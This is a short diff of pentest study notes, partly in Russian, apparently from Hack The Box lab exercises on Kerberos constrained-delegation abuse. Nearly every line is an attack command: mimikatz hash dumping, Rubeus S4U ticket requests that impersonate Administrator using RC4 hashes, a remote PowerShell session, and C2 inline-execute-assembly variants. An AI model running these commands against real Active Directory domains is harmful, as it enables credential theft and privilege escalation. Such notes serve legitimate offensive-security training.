@@ -899,10 +899,18 @@
 
   		на хосте, где настроено делегирование
 		.\mimikatz.exe privilege::debug sekurlsa::msv exit 	(получение хеша ПК)
-		(ПОЛУЧЕНИЕ TGS ДЛЯ ПОЛЬЗОВАТЕЛЯ ADMINISTRATOR ЧЕРЕЗ S4USELF)
+
+  		(ПОЛУЧЕНИЕ TGS ДЛЯ ПОЛЬЗОВАТЕЛЯ ADMINISTRATOR ЧЕРЕЗ S4USELF)
+
   		.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt 
   		klist
   		Enter-PSSession ws01.inlanefreight.local  (evil-winrm from windiws)
+		ИЛИ
+		inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 'asktgt /user:web01$ /rc4:021b6a0d0e0ca246ec266bb72a481bc6 /nowrap'
+
+		inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 's4u /impersonateuser:carrot /msdsspn:eventsystem/srv02.child.htb.local /user:web01$ /ticket:doIE8DCCBOygAwIBBaEDAgEWoo<SNIP>sZC5odGIubG9jYWw= /nowrap'
+		
+
   
 * Constrained Delegation from Linux (  Constrained w/ Protocol Transition)
 
